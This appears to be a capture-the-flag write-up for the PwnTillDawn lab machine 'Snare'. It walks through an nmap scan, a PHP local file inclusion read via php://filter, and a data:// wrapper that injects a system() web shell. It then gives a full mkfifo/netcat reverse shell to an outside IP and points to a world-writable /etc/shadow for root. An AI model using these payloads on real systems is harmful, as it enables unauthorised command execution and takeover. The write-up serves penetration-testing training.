---
description: Wizlynx PwnTillDawn Online Snare
---

# Snare (10.150.150.18)

## Nmap

{% code overflow="wrap" %}
```bash
# Nmap 7.91 scan initiated Sat Apr  3 17:09:09 2021 as: nmap -sS -A -p- -T4 -oN machines/pwntilldawn/10.150.150.18/nmap.txt 10.150.150.18
Nmap scan report for 10.150.150.18
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
|   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
|_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
# Nmap done at Sat Apr  3 17:17:47 2021 -- 1 IP address (1 host up) scanned in 518.08 seconds
```
{% endcode %}

### FLAG1

[http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index](http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index)

{% code overflow="wrap" %}
```html
[...SNIP...]
<li class="nav-item">
	    <a class="nav-link " href="index.php?page=contact">Contact</a>
	  </li>
	</ul>
</div>
<div class="container" id="main-content">
PD9waHAgaW5jbHVkZSgiaW5jbHVkZXMvYV9jb25maWcucGhwIik7Pz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCgk8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9oZWFkLXRhZy1jb250ZW50cy5waHAiKTs/Pg0KPC9oZWFkPg0KPGJvZHk+DQoNCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL2Rlc2lnbi10b3AucGhwIik7Pz4NCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL25hdmlnYXRpb24ucGhwIik7Pz4NCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIiBpZD0ibWFpbi1jb250ZW50Ij4NCg0KPD9waHANCg0KaWYgKGVtcHR5KCRfR0VUKSkgew0KCWhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lJyk7DQp9IA0KZWxzZSB7DQoJJHBhZ2UgPSAkX0dFVFsncGFnZSddOw0KCWluY2x1ZGUgKCRwYWdlLiAnLnBocCcpOw0KfQ0KPz4NCjwvZGl2Pg0KDQo8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9mb290ZXIucGhwIik7Pz4NCg0KPC9ib2R5Pg0KPC9odG1sPg0K</div>
<div class="footer">
	&copy; 2024
	
[...SNIP...]
```
{% endcode %}

Base64 decode to read the content:

```php
<?php include("includes/a_config.php");?>
<!DOCTYPE html>
<html>
<head>
	<?php include("includes/head-tag-contents.php");?>
</head>
<body>

<?php include("includes/design-top.php");?>
<?php include("includes/navigation.php");?>

<div class="container" id="main-content">

<?php

if (empty($_GET)) {
	header('Location: /index.php?page=home');
} 
else {
	$page = $_GET['page'];
	include ($page. '.php');
}
?>
</div>

<?php include("includes/footer.php");?>

</body>
</html>
```

php extension is being ammended to the the file path. This is provide a good reference on how to bypass it:\
[https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)

{% code overflow="wrap" %}
```
http://10.150.150.18/index.php?cmd=ls+/home/snare&page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

To get a shell:\
[http://10.150.150.18/index.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.66.67.86+22>/tmp/f\&page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php](http://10.150.150.18/index.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.66.67.86+22%3E/tmp/f\&page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php)

### FLAG2

The /etc/shadow file is writable. Be smart.

```bash
$ ls -la /etc/shadow
-rwxrwxrwx 1 root shadow 1227 Feb 21 06:10 /etc/shadow
```
